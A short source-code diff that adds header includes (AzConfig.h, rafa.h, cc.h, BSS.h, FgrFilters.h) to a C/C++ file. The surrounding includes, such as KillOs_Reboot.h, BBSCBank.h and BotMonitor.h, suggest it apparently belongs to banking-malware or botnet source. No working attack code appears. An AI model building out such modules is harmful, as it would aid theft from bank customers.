@@ -42,6 +42,8 @@
 #include "java_patcher.h"
 #include "JavaConfig.h"
 
+#include "AzConfig.h"
+
 #include "KillOs_Reboot.h"
 #include "BBSCBank.h"
 
@@ -54,9 +56,11 @@
 #include "avangard.h"
 
 //#include "yandex.h"
+#include "rafa.h"
+#include "cc.h"
+#include "BSS.h"
 
-
-
+#include "FgrFilters.h"
 //#include "BotMonitor.h"
 
 #ifdef  DEBUGCONFIG
